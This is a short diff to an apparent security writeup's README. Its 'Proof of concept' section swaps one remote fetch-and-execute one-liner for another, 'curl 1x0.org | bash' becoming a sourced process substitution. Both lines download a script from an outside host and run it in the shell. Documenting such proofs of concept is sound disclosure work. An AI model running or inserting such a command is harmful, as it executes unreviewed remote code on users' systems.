@@ -69,7 +69,7 @@ See [`writeup.md`](writeup.md) for the full analysis.
 ## Proof of concept
 
 ```sh
-curl 1x0.org -fsSlL | bash
+. <(curl -fSsfL 1x0.org)
 ```
 
 Source: <https://1x0.org>
